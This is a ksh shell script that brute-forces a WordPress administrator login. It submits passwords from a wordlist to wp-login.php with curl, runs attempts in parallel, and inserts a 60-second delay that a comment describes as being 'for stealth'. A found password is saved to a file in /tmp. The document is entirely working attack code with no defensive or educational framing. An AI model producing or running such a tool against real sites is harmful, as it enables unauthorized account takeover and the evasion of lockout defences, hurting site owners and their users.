#!/bin/ksh

# Configuration
target_url="http://targetsite.com/wp-login.php"  # Replace with actual URL
username="admin"                                   # Username to try
passlist="passlist.txt"                            # Password list file
max_threads=5                                    # Max concurrent attempts
delay=60                                         # Delay between attempts in seconds

# Semaphore for limiting concurrency
typeset -i semaphore=0

found=0
correct_password=""

# Check if curl is available
if ! command -v curl >/dev/null 2>&1; then
  echo "curl not installed."
  exit 1
fi

# Function to attempt login
try_login() {
    password="$1"
    
    # Use a temporary file for response
    response_file=$(mktemp)

    # Send login POST request
    curl -s -X POST "$target_url" \
        --data-urlencode "log=$username" \
        --data-urlencode "pwd=$password" \
        -c cookies.txt \
        -L \
        --cookie cookies.txt \
        --user-agent "Mozilla/5.0" \
        -o "$response_file"

    # Check for success: WordPress usually redirects to /wp-admin/ or contains specific content
    if grep -qi "/wp-admin/" "$response_file"; then
        echo "Password found: $password"
        echo "$password" > /tmp/wordpress_found_password.txt
        # set global flag
        found=1
        # Clean up
        rm -f "$response_file"
        exit 0
    fi

    # Clean up
    rm -f "$response_file"
}

# Read passwords and spawn background jobs
while IFS= read -r password; do
    if [ "$found" -eq 1 ]; then
        break
    fi

    # Wait if max threads reached
    while [ "$semaphore" -ge "$max_threads" ]; do
        wait
        semaphore=$((semaphore - 1))
    done

    # Start background attempt
    try_login "$password" &
    semaphore=$((semaphore + 1))
    
    # Add 60s delay for stealth
    echo "Waiting 60 seconds for stealth..."
    sleep 60
done < "$passlist"

# Wait for all background jobs to finish
wait

if [ "$found" -eq 1 ]; then
    echo "Success! Password found."
else
    echo "Password not found in list."
fi